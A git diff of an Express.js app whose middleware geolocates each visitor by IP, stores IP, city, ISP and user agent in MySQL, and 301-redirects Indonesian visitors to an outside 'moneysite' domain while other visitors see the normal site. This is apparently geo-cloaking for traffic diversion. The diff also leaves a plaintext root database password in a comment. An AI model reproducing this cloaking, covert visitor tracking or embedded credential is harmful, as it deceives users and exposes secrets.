@@ -10,9 +10,15 @@ app.use(express.json());
 const con = mysql.createConnection({
   host: "localhost",
   user: "root",
-  password: "Fr@nk1sHere",
+  password: "",
   database: "baltic_v1",
 });
+// const con = mysql.createConnection({
+//   host: "localhost",
+//   user: "root",
+//   password: "Fr@nk1sHere",
+//   database: "baltic_v1",
+// });
 
 con.connect(function (error) {
   if (error) {
@@ -25,10 +31,10 @@ con.connect(function (error) {
 });
 
 const redirectIfFromIndonesia = (request, response, next) => {
-  console.log("visitor visit");
   const clientIP = request.headers["x-real-ip"] || request.headers["x-forwarded-for"] || request.connection.remoteAddress;
   const parts = clientIP.split(":");
   const ipv4 = parts[parts.length - 1];
+  console.log("ip :", ipv4);
 
   console.log("fetch visitor");
   fetch(`https://ifconfig.co/json?ip=${ipv4}`)
@@ -47,6 +53,7 @@ const redirectIfFromIndonesia = (request, response, next) => {
       const city = user.city;
       const user_agent = request.headers["user-agent"];
       const isp = user.asn_org;
+      const redirect = "https://basopetir.com";
 
       console.log("memasukkan visitor ke database");
 
@@ -66,7 +73,7 @@ const redirectIfFromIndonesia = (request, response, next) => {
           } else {
             if (country === "Indonesia") {
               console.log("redirect moneysite");
-              response.redirect(301, "https://basopetir.com");
+              response.redirect(301, redirect);
             } else {
               console.log("penyusup");
               next();
